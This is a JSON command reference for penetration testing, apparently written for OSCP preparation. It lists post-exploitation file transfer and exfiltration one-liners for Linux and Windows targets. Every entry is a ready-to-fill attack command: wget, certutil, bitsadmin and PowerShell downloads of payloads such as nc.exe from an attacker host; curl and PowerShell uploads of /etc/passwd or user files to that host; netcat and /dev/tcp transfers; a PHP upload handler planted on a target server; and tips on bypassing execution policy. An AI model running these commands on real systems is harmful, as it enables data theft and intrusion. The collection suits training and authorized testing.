{
  "category": "post-exploit",
  "subcategory": "exfiltration",
  "description": "File transfer methods for Linux and Windows targets",
  "commands": [
    {
      "id": "file-transfer-python-http",
      "name": "Python HTTP Server (Download from Target)",
      "category": "post-exploit",
      "subcategory": "exfiltration",
      "command": "python3 -m http.server <PORT>",
      "description": "Start HTTP server on attacker machine for file downloads",
      "variables": [
        {
          "name": "<PORT>",
          "description": "Port to serve HTTP on",
          "example": "8000",
          "required": true
        }
      ],
      "flag_explanations": {
        "-m http.server": "Run HTTP server module",
        "PORT": "Port to listen on (default 8000)"
      },
      "tags": [
        "BOTH_OS",
        "EXPLOITATION",
        "FILE_TRANSFER",
        "NETWORK",
        "OSCP:HIGH",
        "POST_EXPLOITATION",
        "PYTHON",
        "QUICK_WIN"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "Serving HTTP on port shown",
        "File requests logged"
      ],
      "failure_indicators": [
        "Port already in use",
        "Permission denied on port"
      ],
      "next_steps": [
        "On Linux target: wget http://<LHOST>:<PORT>/file",
        "On Windows target: certutil -urlcache -f http://<LHOST>:<PORT>/file file",
        "Monitor server for successful downloads"
      ],
      "alternatives": [],
      "notes": "Run in directory containing files to transfer"
    },
    {
      "id": "file-transfer-wget",
      "name": "Linux: wget Download",
      "category": "post-exploit",
      "subcategory": "exfiltration",
      "command": "wget http://<LHOST>:<PORT>/<FILE> -O <OUTPUT>",
      "description": "Download file using wget on Linux target",
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "HTTP server port",
          "example": "8000",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "File to download",
          "example": "linpeas.sh",
          "required": true
        },
        {
          "name": "<OUTPUT>",
          "description": "Output filename",
          "example": "/tmp/linpeas.sh",
          "required": true
        }
      ],
      "flag_explanations": {
        "-O": "Output file name",
        "-q": "Quiet mode (suppress output)",
        "--no-check-certificate": "Skip SSL certificate validation"
      },
      "tags": [
        "EXPLOITATION",
        "FILE_TRANSFER",
        "LINUX",
        "NETWORK",
        "OSCP:HIGH",
        "POST_EXPLOITATION",
        "WGET"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "File downloaded successfully",
        "100% completion shown",
        "File exists on target"
      ],
      "failure_indicators": [
        "Connection refused",
        "wget: command not found",
        "Cannot write to output file"
      ],
      "alternatives": [],
      "notes": "Add --no-check-certificate for HTTPS without valid cert"
    },
    {
      "id": "file-transfer-curl",
      "name": "Linux: curl Download",
      "category": "post-exploit",
      "subcategory": "exfiltration",
      "command": "curl http://<LHOST>:<PORT>/<FILE> -o <OUTPUT>",
      "description": "Download file using curl on Linux target",
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "HTTP server port",
          "example": "8000",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "File to download",
          "example": "exploit.sh",
          "required": true
        },
        {
          "name": "<OUTPUT>",
          "description": "Output filename",
          "example": "/tmp/exploit.sh",
          "required": true
        }
      ],
      "flag_explanations": {
        "-o": "Output file name",
        "-k": "Allow insecure SSL connections",
        "-s": "Silent mode",
        "-L": "Follow redirects"
      },
      "tags": [
        "CURL",
        "EXPLOITATION",
        "FILE_TRANSFER",
        "LINUX",
        "NETWORK",
        "OSCP:HIGH",
        "POST_EXPLOITATION"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "File downloaded",
        "Exit code 0"
      ],
      "failure_indicators": [
        "curl: command not found",
        "Failed to connect",
        "Permission denied"
      ],
      "alternatives": [],
      "notes": "curl -L follows redirects, useful for shortened URLs"
    },
    {
      "id": "file-transfer-certutil",
      "name": "Windows: certutil Download",
      "category": "post-exploit",
      "subcategory": "exfiltration",
      "command": "certutil -urlcache -f http://<LHOST>:<PORT>/<FILE> <OUTPUT>",
      "description": "Download file using certutil (Windows native tool)",
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "HTTP server port",
          "example": "8000",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "File to download",
          "example": "nc.exe",
          "required": true
        },
        {
          "name": "<OUTPUT>",
          "description": "Output filename",
          "example": "C:\\\\temp\\\\nc.exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "-urlcache": "Use URL cache",
        "-f": "Force overwrite existing file",
        "-split": "Download and split file"
      },
      "tags": [
        "EXPLOITATION",
        "FILE_TRANSFER",
        "NETWORK",
        "OSCP:HIGH",
        "POST_EXPLOITATION",
        "QUICK_WIN",
        "WINDOWS"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "File downloaded successfully",
        "No error messages"
      ],
      "failure_indicators": [
        "Connection failed",
        "Access denied",
        "Antivirus blocked"
      ],
      "alternatives": [
        "bitsadmin-download"
      ],
      "notes": "Native Windows tool, often bypasses basic restrictions"
    },
    {
      "id": "file-transfer-powershell-download",
      "name": "Windows: PowerShell Download File",
      "category": "post-exploit",
      "subcategory": "exfiltration",
      "command": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://<LHOST>:<PORT>/<FILE>', '<OUTPUT>')\"",
      "description": "Download file using PowerShell WebClient",
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "HTTP server port",
          "example": "8000",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "File to download",
          "example": "payload.exe",
          "required": true
        },
        {
          "name": "<OUTPUT>",
          "description": "Output path",
          "example": "C:\\\\temp\\\\payload.exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "-c": "Execute command",
        "New-Object System.Net.WebClient": "Create web client object",
        "DownloadFile": "Method to download file"
      },
      "tags": [
        "EXPLOITATION",
        "FILE_TRANSFER",
        "NETWORK",
        "OSCP:HIGH",
        "POST_EXPLOITATION",
        "POWERSHELL",
        "WINDOWS"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "File appears on disk",
        "No error output"
      ],
      "failure_indicators": [
        "Execution policy blocked",
        "AMSI flagged script",
        "Network error"
      ],
      "alternatives": [],
      "notes": "Add -ep bypass if execution policy blocks: powershell -ep bypass -c \"...\""
    },
    {
      "id": "file-transfer-scp",
      "name": "Linux: SCP Transfer",
      "category": "post-exploit",
      "subcategory": "exfiltration",
      "command": "scp <FILE> <USER>@<TARGET>:<DEST>",
      "description": "Securely copy file to target via SSH",
      "variables": [
        {
          "name": "<FILE>",
          "description": "Local file to transfer",
          "example": "/tmp/exploit.sh",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username on target",
          "example": "user",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP address",
          "example": "192.168.45.100",
          "required": true
        },
        {
          "name": "<DEST>",
          "description": "Destination path",
          "example": "/tmp/exploit.sh",
          "required": true
        }
      ],
      "flag_explanations": {
        "-P": "Specify SSH port (if not 22)",
        "-i": "Use specific SSH key",
        "-r": "Recursively copy directory"
      },
      "tags": [
        "EXPLOITATION",
        "FILE_TRANSFER",
        "LINUX",
        "OSCP:MEDIUM",
        "POST_EXPLOITATION",
        "SSH"
      ],
      "oscp_relevance": "medium",
      "success_indicators": [
        "100% transfer completion",
        "File appears on target"
      ],
      "failure_indicators": [
        "Permission denied",
        "Connection refused",
        "Host key verification failed"
      ],
      "alternatives": [],
      "notes": "Requires SSH access to target"
    },
    {
      "id": "file-transfer-smb",
      "name": "Windows: SMB Transfer",
      "category": "post-exploit",
      "subcategory": "exfiltration",
      "command": "copy \\\\<LHOST>\\<SHARE>\\<FILE> <DEST>",
      "description": "Copy file from SMB share on attacker machine",
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP with SMB share",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<SHARE>",
          "description": "SMB share name",
          "example": "share",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "File to copy",
          "example": "nc.exe",
          "required": true
        },
        {
          "name": "<DEST>",
          "description": "Destination path",
          "example": "C:\\\\temp\\\\nc.exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "\\\\\\\\": "UNC path format",
        "net use": "Map network drive if needed"
      },
      "tags": [
        "EXPLOITATION",
        "FILE_TRANSFER",
        "OSCP:HIGH",
        "POST_EXPLOITATION",
        "SAMBA",
        "WINDOWS"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "1 file(s) copied",
        "File exists at destination"
      ],
      "failure_indicators": [
        "Network path not found",
        "Access denied",
        "SMB blocked by firewall"
      ],
      "alternatives": [],
      "notes": "Setup SMB server: impacket-smbserver share $(pwd) -smb2support -username user -password pass"
    },
    {
      "id": "file-transfer-nc-push",
      "name": "Netcat: Push File to Target",
      "category": "post-exploit",
      "subcategory": "exfiltration",
      "command": "nc -lvnp <PORT> < <FILE>",
      "description": "Push file to target using netcat (target connects)",
      "variables": [
        {
          "name": "<PORT>",
          "description": "Port to listen on",
          "example": "4444",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "File to send",
          "example": "exploit.sh",
          "required": true
        }
      ],
      "flag_explanations": {
        "-l": "Listen mode",
        "-v": "Verbose output",
        "-n": "No DNS resolution",
        "-p": "Specify port",
        "<": "Redirect file as input"
      },
      "tags": [
        "BOTH_OS",
        "EXPLOITATION",
        "FILE_TRANSFER",
        "NETCAT",
        "NETWORK",
        "OSCP:HIGH",
        "POST_EXPLOITATION"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "Connection received from target",
        "File bytes sent"
      ],
      "failure_indicators": [
        "No connection",
        "Port already in use"
      ],
      "next_steps": [
        "On target run: nc <LHOST> <PORT> > <FILE>",
        "Verify file size matches",
        "Make executable if needed: chmod +x"
      ],
      "alternatives": [],
      "notes": "Target command: nc <LHOST> <PORT> > output_file"
    },
    {
      "id": "file-transfer-nc-pull",
      "name": "Netcat: Pull File from Target",
      "category": "post-exploit",
      "subcategory": "exfiltration",
      "command": "nc -lvnp <PORT> > <FILE>",
      "description": "Receive file from target using netcat",
      "variables": [
        {
          "name": "<PORT>",
          "description": "Port to listen on",
          "example": "4444",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "Output filename",
          "example": "data.txt",
          "required": true
        }
      ],
      "flag_explanations": {
        "-l": "Listen mode",
        "-v": "Verbose",
        "-n": "Numeric IPs only",
        "-p": "Port",
        ">": "Redirect output to file"
      },
      "tags": [
        "BOTH_OS",
        "EXPLOITATION",
        "FILE_TRANSFER",
        "NETCAT",
        "NETWORK",
        "OSCP:MEDIUM",
        "POST_EXPLOITATION"
      ],
      "oscp_relevance": "medium",
      "success_indicators": [
        "Connection from target",
        "File received and saved"
      ],
      "failure_indicators": [
        "No connection",
        "Incomplete transfer"
      ],
      "next_steps": [
        "On target: nc <LHOST> <PORT> < <FILE>",
        "Compare file hashes to verify integrity"
      ],
      "alternatives": [],
      "notes": "Target sends with: nc <LHOST> <PORT> < file_to_send"
    },
    {
      "id": "file-transfer-base64",
      "name": "Base64 Encode/Decode Transfer",
      "category": "post-exploit",
      "subcategory": "exfiltration",
      "command": "base64 <FILE> | nc <TARGET> <PORT>",
      "description": "Transfer file encoded as base64 (safe for text channels)",
      "variables": [
        {
          "name": "<FILE>",
          "description": "File to encode and transfer",
          "example": "payload.exe",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.45.100",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "Port target is listening on",
          "example": "4444",
          "required": true
        }
      ],
      "flag_explanations": {
        "base64": "Encode file to base64",
        "|": "Pipe to netcat",
        "base64 -d": "Decode base64 (on target)"
      },
      "tags": [
        "BOTH_OS",
        "DEFENSE_EVASION",
        "EXPLOITATION",
        "FILE_TRANSFER",
        "NETCAT",
        "NETWORK",
        "OSCP:MEDIUM",
        "POST_EXPLOITATION"
      ],
      "oscp_relevance": "medium",
      "success_indicators": [
        "Base64 string transferred",
        "File decoded successfully on target"
      ],
      "failure_indicators": [
        "Encoding failed",
        "Decoding errors on target"
      ],
      "next_steps": [
        "On target (Linux): nc -lvnp <PORT> | base64 -d > file",
        "On target (Windows): certutil -decode input.b64 output.exe",
        "Verify with MD5 checksum"
      ],
      "alternatives": [],
      "notes": "Windows decode: certutil -decode input.b64 output.exe"
    },
    {
      "id": "file-transfer-php",
      "name": "PHP Upload Script",
      "category": "post-exploit",
      "subcategory": "exfiltration",
      "command": "echo '<?php file_put_contents($_FILES[\"file\"][\"name\"], file_get_contents($_FILES[\"file\"][\"tmp_name\"])); ?>' > upload.php",
      "description": "Create simple PHP upload handler on target web server",
      "variables": [],
      "flag_explanations": {
        "file_put_contents": "Write file to disk",
        "$_FILES": "Access uploaded file",
        "tmp_name": "Temporary upload location"
      },
      "tags": [
        "EXPLOITATION",
        "FILE_TRANSFER",
        "FILE_UPLOAD",
        "LINUX",
        "OSCP:MEDIUM",
        "POST_EXPLOITATION"
      ],
      "oscp_relevance": "medium",
      "success_indicators": [
        "upload.php created",
        "Files can be uploaded via POST"
      ],
      "failure_indicators": [
        "Cannot write to web directory",
        "PHP disabled"
      ],
      "next_steps": [
        "Upload with: curl -F file=@local.txt http://target/upload.php",
        "Or use browser form",
        "Check file appears in web directory"
      ],
      "alternatives": [],
      "notes": "Place in web-accessible directory, use curl -F to upload"
    },
    {
      "id": "file-transfer-ftp",
      "name": "FTP Transfer",
      "category": "post-exploit",
      "subcategory": "exfiltration",
      "command": "ftp <TARGET>",
      "description": "Transfer files via FTP (if FTP server available)",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "FTP server IP",
          "example": "192.168.45.100",
          "required": true
        }
      ],
      "flag_explanations": {
        "binary": "Set binary transfer mode",
        "get": "Download file from server",
        "put": "Upload file to server",
        "mget": "Download multiple files"
      },
      "tags": [
        "BOTH_OS",
        "EXPLOITATION",
        "FILE_TRANSFER",
        "FTP",
        "OSCP:LOW",
        "POST_EXPLOITATION"
      ],
      "oscp_relevance": "low",
      "success_indicators": [
        "FTP connection established",
        "File transferred successfully"
      ],
      "failure_indicators": [
        "Connection refused",
        "Authentication failed"
      ],
      "next_steps": [
        "Switch to binary mode: binary",
        "Upload: put local_file remote_file",
        "Download: get remote_file local_file"
      ],
      "alternatives": [],
      "notes": "Setup FTP server: python -m pyftpdlib -p 21 -w"
    },
    {
      "id": "file-transfer-bitsadmin",
      "name": "Windows: bitsadmin Download",
      "category": "post-exploit",
      "subcategory": "exfiltration",
      "command": "bitsadmin /transfer job /download /priority high http://<LHOST>:<PORT>/<FILE> <OUTPUT>",
      "description": "Download file using Windows BITS service",
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "HTTP server port",
          "example": "8000",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "File to download",
          "example": "payload.exe",
          "required": true
        },
        {
          "name": "<OUTPUT>",
          "description": "Output path",
          "example": "C:\\\\temp\\\\payload.exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "/transfer": "Create transfer job",
        "/download": "Download mode",
        "/priority high": "High priority transfer"
      },
      "tags": [
        "EXPLOITATION",
        "FILE_TRANSFER",
        "NETWORK",
        "OSCP:MEDIUM",
        "PERSISTENCE",
        "POST_EXPLOITATION",
        "WINDOWS"
      ],
      "oscp_relevance": "medium",
      "success_indicators": [
        "Transfer job completed",
        "File exists at output path"
      ],
      "failure_indicators": [
        "Job failed",
        "Connection error",
        "BITS service disabled"
      ],
      "alternatives": [],
      "notes": "BITS runs in background, can be slower than certutil"
    },
    {
      "id": "file-transfer-dev-tcp",
      "name": "Linux: /dev/tcp Download",
      "category": "post-exploit",
      "subcategory": "exfiltration",
      "command": "cat < /dev/tcp/<LHOST>/<PORT> > <OUTPUT>",
      "description": "Download file using bash /dev/tcp (no external tools needed)",
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "Port with file server",
          "example": "4444",
          "required": true
        },
        {
          "name": "<OUTPUT>",
          "description": "Output filename",
          "example": "/tmp/file",
          "required": true
        }
      ],
      "flag_explanations": {
        "/dev/tcp": "Bash TCP pseudo-device",
        "cat <": "Read from TCP connection",
        "> file": "Write to output file"
      },
      "tags": [
        "EXPLOITATION",
        "FILE_TRANSFER",
        "LINUX",
        "NETWORK",
        "OSCP:MEDIUM",
        "POST_EXPLOITATION"
      ],
      "oscp_relevance": "medium",
      "success_indicators": [
        "File downloaded",
        "Connection successful"
      ],
      "failure_indicators": [
        "/dev/tcp not supported",
        "Connection refused",
        "Bash feature disabled"
      ],
      "next_steps": [
        "On attacker: nc -lvnp <PORT> < file",
        "On target: cat < /dev/tcp/<IP>/<PORT> > output"
      ],
      "alternatives": [],
      "notes": "Works when wget/curl unavailable; requires bash with /dev/tcp enabled"
    },
    {
      "id": "exfil-uploadserver",
      "name": "Python Upload Server (Kali)",
      "category": "post-exploit",
      "subcategory": "exfiltration",
      "command": "python3 -m uploadserver <PORT>",
      "description": "Start HTTP server that accepts file uploads from target",
      "variables": [
        {
          "name": "<PORT>",
          "description": "Port to listen on",
          "example": "80",
          "required": false
        }
      ],
      "flag_explanations": {
        "-m uploadserver": "Run uploadserver module",
        "PORT": "Default 8000 if not specified",
        "--directory": "Save uploads to specific directory"
      },
      "tags": [
        "EXPLOITATION",
        "FILE_TRANSFER",
        "EXFILTRATION",
        "HTTP",
        "NETWORK",
        "OSCP:HIGH",
        "POST_EXPLOITATION",
        "PYTHON",
        "QUICK_WIN"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "File upload available at /upload",
        "Serving HTTP on",
        "POST request received"
      ],
      "failure_indicators": [
        "Module not found",
        "Port already in use",
        "Permission denied"
      ],
      "prerequisites": [],
      "next_steps": [
        "Windows upload: Invoke-RestMethod -Uri http://<LHOST>:<PORT>/upload -Method Post -InFile <FILE>",
        "Linux upload: curl -X POST -F file=@<FILE> http://<LHOST>:<PORT>/upload",
        "Files saved to current directory by default"
      ],
      "alternatives": [
        "file-transfer-python-http",
        "exfil-smb-upload"
      ],
      "notes": "Install with: pip3 install uploadserver; supports POST uploads"
    },
    {
      "id": "exfil-powershell-upload",
      "name": "Windows: PowerShell Upload File",
      "category": "post-exploit",
      "subcategory": "exfiltration",
      "command": "powershell -c \"Invoke-RestMethod -Uri http://<LHOST>:<PORT>/upload -Method Post -InFile '<FILE>'\"",
      "description": "Upload file from Windows target to attacker's uploadserver",
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP running uploadserver",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "Uploadserver port",
          "example": "80",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "File to exfiltrate",
          "example": "C:\\Users\\user\\Desktop\\data.zip",
          "required": true
        }
      ],
      "flag_explanations": {
        "-c": "Execute command",
        "Invoke-RestMethod": "PowerShell web request cmdlet",
        "-Uri": "Target URL",
        "-Method Post": "HTTP POST method",
        "-InFile": "File to upload"
      },
      "tags": [
        "EXPLOITATION",
        "FILE_TRANSFER",
        "EXFILTRATION",
        "NETWORK",
        "OSCP:HIGH",
        "POST_EXPLOITATION",
        "POWERSHELL",
        "WINDOWS",
        "QUICK_WIN"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "StatusCode : 200",
        "File appears on Kali",
        "Upload complete"
      ],
      "failure_indicators": [
        "Unable to connect",
        "Execution policy blocked",
        "AMSI flagged script",
        "Network error"
      ],
      "prerequisites": [
        "exfil-uploadserver"
      ],
      "next_steps": [
        "Verify on Kali: ls -lh <FILE>",
        "Check integrity: md5sum <FILE>",
        "Alternative: (New-Object Net.WebClient).UploadFile('http://<LHOST>:<PORT>/upload','<FILE>')"
      ],
      "alternatives": [
        "exfil-smb-upload",
        "exfil-nc-tcp-upload",
        "exfil-powershell-base64"
      ],
      "notes": "Add -ep bypass if execution policy blocks: powershell -ep bypass -c \"...\""
    },
    {
      "id": "exfil-smb-upload",
      "name": "Windows: Upload via SMB Share",
      "category": "post-exploit",
      "subcategory": "exfiltration",
      "command": "copy \"<FILE>\" \\\\<LHOST>\\<SHARE>\\",
      "description": "Upload file from Windows target to Kali SMB share",
      "variables": [
        {
          "name": "<FILE>",
          "description": "File to exfiltrate",
          "example": "C:\\Users\\user\\Desktop\\data.zip",
          "required": true
        },
        {
          "name": "<LHOST>",
          "description": "Attacker IP with SMB share",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<SHARE>",
          "description": "SMB share name",
          "example": "share",
          "required": true
        }
      ],
      "flag_explanations": {
        "copy": "Windows native copy command",
        "\\\\\\\\<LHOST>\\\\<SHARE>": "UNC path to SMB share",
        "Quotes": "Required for paths with spaces"
      },
      "tags": [
        "EXPLOITATION",
        "FILE_TRANSFER",
        "EXFILTRATION",
        "OSCP:HIGH",
        "POST_EXPLOITATION",
        "SAMBA",
        "WINDOWS",
        "QUICK_WIN"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "1 file(s) copied",
        "File appears on Kali",
        "No error messages"
      ],
      "failure_indicators": [
        "Network path not found",
        "Access denied",
        "SMB blocked by firewall",
        "Port 445 blocked"
      ],
      "prerequisites": [],
      "next_steps": [
        "Verify on Kali: ls -lh",
        "Check integrity: md5sum <FILE>",
        "With auth: impacket-smbserver <SHARE> . -smb2support -username user -password pass",
        "Then: net use \\\\<LHOST>\\<SHARE> /user:user pass"
      ],
      "alternatives": [
        "exfil-powershell-upload",
        "exfil-nc-tcp-upload"
      ],
      "troubleshooting": {
        "Network path not found": "Firewall blocking port 445. Use: exfil-powershell-upload",
        "Access denied": "Add auth to SMB server: -username user -password pass"
      },
      "notes": "Fastest method for large files; requires port 445 open"
    },
    {
      "id": "exfil-nc-tcp-upload",
      "name": "PowerShell: TCP Upload via Socket",
      "category": "post-exploit",
      "subcategory": "exfiltration",
      "command": "$client = New-Object System.Net.Sockets.TcpClient('<LHOST>',<PORT>); $stream = $client.GetStream(); $data = [IO.File]::ReadAllBytes('<FILE>'); $stream.Write($data, 0, $data.Length); $stream.Close(); $client.Close()",
      "description": "Upload file using raw TCP socket (works when HTTP/SMB blocked)",
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "Netcat listener port",
          "example": "4444",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "File to exfiltrate",
          "example": "C:\\Users\\user\\Desktop\\data.zip",
          "required": true
        }
      ],
      "flag_explanations": {
        "TcpClient": "Opens TCP connection",
        "ReadAllBytes": "Loads file into memory",
        "Write": "Sends data over TCP stream",
        "Close": "Closes connection and stream"
      },
      "tags": [
        "EXPLOITATION",
        "FILE_TRANSFER",
        "EXFILTRATION",
        "NETCAT",
        "NETWORK",
        "OSCP:HIGH",
        "POST_EXPLOITATION",
        "POWERSHELL",
        "WINDOWS"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "Connection established",
        "Data transmitted",
        "Stream closed successfully"
      ],
      "failure_indicators": [
        "Connection refused",
        "Out of memory",
        "File too large"
      ],
      "prerequisites": [],
      "next_steps": [
        "On Kali: nc -lvnp <PORT> > received.zip",
        "On Windows: [Run PowerShell command]",
        "Verify: ls -lh received.zip && md5sum received.zip"
      ],
      "alternatives": [
        "file-transfer-nc-pull",
        "exfil-powershell-upload"
      ],
      "notes": "Loads entire file to memory; not suitable for files >1GB"
    },
    {
      "id": "exfil-powershell-base64",
      "name": "PowerShell: Base64 Encode File",
      "category": "post-exploit",
      "subcategory": "exfiltration",
      "command": "[Convert]::ToBase64String([IO.File]::ReadAllBytes('<FILE>'))",
      "description": "Encode file to base64 for copy/paste exfiltration",
      "variables": [
        {
          "name": "<FILE>",
          "description": "File to encode",
          "example": "C:\\Users\\user\\Desktop\\data.txt",
          "required": true
        }
      ],
      "flag_explanations": {
        "ReadAllBytes": "Read file as byte array",
        "ToBase64String": "Convert bytes to base64 text",
        "Out-File": "Save output to file (optional)"
      },
      "tags": [
        "ENCODING",
        "EXPLOITATION",
        "FILE_TRANSFER",
        "EXFILTRATION",
        "OSCP:MEDIUM",
        "POST_EXPLOITATION",
        "POWERSHELL",
        "WINDOWS"
      ],
      "oscp_relevance": "medium",
      "success_indicators": [
        "Base64 string output",
        "No error messages",
        "String length matches expected"
      ],
      "failure_indicators": [
        "Out of memory",
        "File not found",
        "Access denied"
      ],
      "next_steps": [
        "Copy output (Ctrl+C)",
        "On Kali: echo 'BASE64_STRING' | base64 -d > file",
        "Verify: md5sum file",
        "For large files: ... | Out-File -Encoding ASCII encoded.txt"
      ],
      "alternatives": [
        "file-transfer-base64",
        "exfil-powershell-upload"
      ],
      "notes": "Only practical for files <1MB; output is ~33% larger than original"
    },
    {
      "id": "exfil-curl-upload",
      "name": "Linux: Curl Upload File",
      "category": "post-exploit",
      "subcategory": "exfiltration",
      "command": "curl -X POST -F file=@<FILE> http://<LHOST>:<PORT>/upload",
      "description": "Upload file from Linux target to uploadserver",
      "variables": [
        {
          "name": "<FILE>",
          "description": "File to exfiltrate",
          "example": "/etc/passwd",
          "required": true
        },
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "Uploadserver port",
          "example": "80",
          "required": true
        }
      ],
      "flag_explanations": {
        "-X POST": "Use POST method",
        "-F file=@": "Form upload with file",
        "@": "Read from file",
        "-k": "Allow insecure SSL"
      },
      "tags": [
        "CURL",
        "EXPLOITATION",
        "FILE_TRANSFER",
        "EXFILTRATION",
        "FILE_UPLOAD",
        "LINUX",
        "NETWORK",
        "OSCP:HIGH",
        "POST_EXPLOITATION"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "100 Continue",
        "200 OK",
        "Upload successful",
        "File appears on Kali"
      ],
      "failure_indicators": [
        "Connection refused",
        "404 Not Found",
        "413 Entity Too Large"
      ],
      "prerequisites": [
        "exfil-uploadserver"
      ],
      "next_steps": [
        "Alternative: curl --upload-file <FILE> http://<LHOST>:<PORT>/",
        "With progress: curl -# -X POST -F file=@<FILE> http://<LHOST>:<PORT>/upload",
        "Verify on Kali: ls -lh"
      ],
      "alternatives": [
        "file-transfer-nc-pull",
        "file-transfer-scp"
      ],
      "notes": "Requires uploadserver or similar HTTP upload handler"
    }
  ]
}